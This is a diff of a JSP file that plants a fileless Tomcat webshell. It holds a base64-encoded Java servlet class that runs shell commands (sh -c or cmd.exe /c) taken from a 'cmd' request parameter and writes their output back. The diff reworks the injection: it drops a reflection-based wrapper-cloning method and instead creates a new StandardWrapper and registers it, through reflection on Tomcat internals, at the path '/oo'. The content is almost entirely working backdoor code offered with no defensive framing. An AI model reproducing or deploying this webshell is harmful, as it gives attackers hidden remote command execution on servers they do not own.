@@ -15,27 +15,6 @@
 <%@ page import="org.apache.catalina.mapper.MappingData" %>
 <%@ page import="org.apache.catalina.core.*" %>
 
-<%!
-    public static Object clone(Object object) throws  IllegalAccessException, InstantiationException {
-        Object cloneObject = null;
-        if( object != null){
-            cloneObject = object.getClass().newInstance();
-        }
-        Field[] fields = object.getClass().getDeclaredFields();
-        for(Field f:fields){
-            if (java.lang.reflect.Modifier.isFinal(f.getModifiers())) {
-                continue;
-            }
-            if (java.lang.reflect.Modifier.isStatic(f.getModifiers())) {
-                continue;
-            }
-            f.setAccessible(true);
-            f.set(cloneObject, f.get(object));
-
-        }
-        return cloneObject;
-    }
-%>
 <%
     String evil_base64="yv66vgAAADQAwAoAJQBYCABZCwBaAFsIAFwKAF0AXgoACQBfCABgCgAJAGEHAGIIAGMIAGQIAGUIAGYKAGcAaAoAZwBpCgBqAGsHAGwKABEAbQgAbgoAEQBvCgARAHAKABEAcQgAcgsAcwB0CgB1AHYKAHUAdwcAeAoAeQB6CAB7CgB8AH0KAH4AfwoAfgCACgCBAIIKAIMAhAkAXQCFCgCGAIcHAIgBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFAAAAAAAAAAEBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEABkx0ZXN0OwEABGluaXQBAApFeGNlcHRpb25zBwCJAQAFZG9HZXQBAFIoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOylWAQAHaXNMaW51eAEAAVoBAAVvc1R5cAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABGNtZHMBABNbTGphdmEvbGFuZy9TdHJpbmc7AQACaW4BABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAAFzAQATTGphdmEvdXRpbC9TY2FubmVyOwEABm91dHB1dAEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAA1TdGFja01hcFRhYmxlBwBiBwA8BwCKBwBsBwB4BwCLBwCMBwCNAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQALaW5wdXRTdHJlYW0BAAVieXRlcwEAAltCAQAEY29kZQEAClNvdXJjZUZpbGUBAAl0ZXN0LmphdmEMACsALAEAA2NtZAcAiwwAjgCPAQAHb3MubmFtZQcAkAwAkQCPDACSAJMBAAN3aW4MAJQAlQEAEGphdmEvbGFuZy9TdHJpbmcBAAJzaAEAAi1jAQAHY21kLmV4ZQEAAi9jBwCWDACXAJgMAJkAmgcAmwwAnACdAQARamF2YS91dGlsL1NjYW5uZXIMACsAngEAAlxBDACfAKAMAKEAogwAowCTAQAABwCMDACkAKUHAKYMAKcAqAwAqQAsAQAEdGVzdAcAqgwAqwCsAQAKdGVzdC5jbGFzcwcArQwArgCvBwCKDACwALEMALIAswcAtAwAtQC4BwC5DAC6ALsMALwAvQcAvgwAvwCoAQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0AQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQATamF2YS9pby9JbnB1dFN0cmVhbQEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEAE2phdmEvaW8vSU9FeGNlcHRpb24BAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAHaGFzTmV4dAEAAygpWgEABG5leHQBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAV3cml0ZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABWZsdXNoAQAPamF2YS9sYW5nL0NsYXNzAQAOZ2V0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQATZ2V0UmVzb3VyY2VBc1N0cmVhbQEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvaW8vSW5wdXRTdHJlYW07AQAJYXZhaWxhYmxlAQADKClJAQAEcmVhZAEABShbQilJAQAQamF2YS91dGlsL0Jhc2U2NAEACmdldEVuY29kZXIBAAdFbmNvZGVyAQAMSW5uZXJDbGFzc2VzAQAcKClMamF2YS91dGlsL0Jhc2U2NCRFbmNvZGVyOwEAGGphdmEvdXRpbC9CYXNlNjQkRW5jb2RlcgEADmVuY29kZVRvU3RyaW5nAQAWKFtCKUxqYXZhL2xhbmcvU3RyaW5nOwEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuACEAGwAlAAAAAQAaACYAJwABACgAAAACACkABAABACsALAABAC0AAAAvAAEAAQAAAAUqtwABsQAAAAIALgAAAAYAAQAAAAsALwAAAAwAAQAAAAUAMAAxAAAAAQAyACwAAgAtAAAAKwAAAAEAAAABsQAAAAIALgAAAAYAAQAAABAALwAAAAwAAQAAAAEAMAAxAAAAMwAAAAQAAQA0AAEANQA2AAIALQAAAYMABQAJAAAAqSsSArkAAwIAxgCgBD4SBLgABToEGQTGABIZBLYABhIHtgAImQAFAz4dmQAfBr0ACVkDEgpTWQQSC1NZBSsSArkAAwIAU6cAHAa9AAlZAxIMU1kEEg1TWQUrEgK5AAMCAFM6BbgADhkFtgAPtgAQOga7ABFZGQa3ABISE7YAFDoHGQe2ABWZAAsZB7YAFqcABRIXOggsuQAYAQAZCLYAGSy5ABgBALYAGrEAAAADAC4AAAAyAAwAAAATAAsAFAANABUAFAAWACYAFwAoABkAYwAaAHAAGwCAABwAlAAdAJ8AHgCoACIALwAAAFwACQANAJsANwA4AAMAFACUADkAOgAEAGMARQA7ADwABQBwADgAPQA+AAYAgAAoAD8AQAAHAJQAFABBADoACAAAAKkAMAAxAAAAAACpAEIAQwABAAAAqQBEAEUAAgBGAAAALgAG/QAoAQcARx9YBwBI/gAuBwBIBwBJBwBKQQcAR/8AFQADBwBLBwBMBwBNAAAAMwAAAAYAAgA0AE4ACQBPAFAAAgAtAAAAhAACAAQAAAAoEhu2ABwSHbYAHkwrtgAfvAhNKyy2ACBXuAAhLLYAIk6yACMttgAksQAAAAIALgAAABoABgAAACUACwAmABIAJwAYACgAIAApACcAKgAvAAAAKgAEAAAAKABRADwAAAALAB0AUgA+AAEAEgAWAFMAVAACACAACABVADoAAwAzAAAABAABAE4AAgBWAAAAAgBXALcAAAAKAAEAgwCBALYACQ==";
     java.lang.ClassLoader classLoader = (java.lang.ClassLoader) Thread.currentThread().getContextClassLoader();
@@ -66,60 +45,18 @@
 
     Object contextVersion = contextObjectToContextVersionMap.get(context);
 
-    Field exactWrappersF = contextVersion.getClass().getDeclaredField("exactWrappers");
-    Object exactWrappers = exactWrappersF.get(contextVersion);
 
+    StandardWrapper wrappershell = (StandardWrapper) context.createWrapper();
+    // wrappershell.setLoadOnStartup(1);
+    // wrappershell.setServletName("oo");
+    // wrappershell.setServlet(servlet);
+    wrappershell.setServletClass(Class.forName("test").getName());
 
-    StandardWrapper wrapperEvil = null;
-    StandardWrapper wrapper = null;
-    org.apache.catalina.connector.Connector[] connectors = service.findConnectors();
-    for(int i=0;i<connectors.length;i++) {
-        if (connectors[i].getScheme().equals("http")) {
-            org.apache.coyote.ProtocolHandler protocolHandler = connectors[i].getProtocolHandler();
-            if (protocolHandler instanceof org.apache.coyote.http11.Http11NioProtocol) {
-                java.lang.reflect.Method getHandlerMethod = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod("getHandler");
-                getHandlerMethod.setAccessible(true);
-                java.lang.reflect.Method getGlobalMethod =  getHandlerMethod.invoke(protocolHandler).getClass().getMethod("getGlobal");
-                org.apache.coyote.RequestGroupInfo global = (org.apache.coyote.RequestGroupInfo) getGlobalMethod.invoke(getHandlerMethod.invoke(protocolHandler));
-                java.lang.reflect.Field processorsField = global.getClass().getDeclaredField("processors");
-                processorsField.setAccessible(true);
-                java.util.List processors = (java.util.List) processorsField.get(global);
-                for (int p=0;p<processors.size();p++){
-                    org.apache.coyote.RequestInfo requestinfo = (org.apache.coyote.RequestInfo) processors.get(p);
-                    java.lang.reflect.Field temReqField = requestinfo.getClass().getDeclaredField("req");
-                    temReqField.setAccessible(true);
-                    org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) temReqField.get(requestinfo);
-                    if(tempRequest.requestURI() != null){
-                        org.apache.catalina.connector.Request req = (org.apache.catalina.connector.Request)tempRequest.getNote(1);
-                        if(req != null)
-                        {
-                            MappingData mappingData = req.getMappingData();
-                            Field wrapperF = mappingData.getClass().getDeclaredField("wrapper");
-                            wrapper = (StandardWrapper) wrapperF.get(mappingData);
-                            if(wrapper != null) {
-                                wrapperEvil = (StandardWrapper) clone(wrapper);
-                                out.print(wrapper);
-                                out.println(wrapperEvil);
-                                Field instanceF = wrapperEvil.getClass().getDeclaredField("instance");
-                                instanceF.setAccessible(true);
-                                instanceF.set(wrapperEvil, servlet);
-                                break;
-                            }
-                        }
-                    }
-
-                }
-            }
-        }
-    }
-    out.println(wrapperEvil.getClass().getName());
-    out.println(wrapperEvil);
-    wrapperEvil.setServletName("hi");
-    Field parentF = ContainerBase.class.getDeclaredField("parent");
-    parentF.setAccessible(true);
-    parentF.set(wrapperEvil, context);
+    Field parent = ContainerBase.class.getDeclaredField("parent");
+    parent.setAccessible(true);
+    parent.set(wrappershell, context);
     addWrapper.setAccessible(true);
-    addWrapper.invoke(mapper, contextVersion, "/hi", wrapperEvil, false, false);
+    addWrapper.invoke(mapper, contextVersion, "/oo", wrappershell, false, false);
 
 %>
 
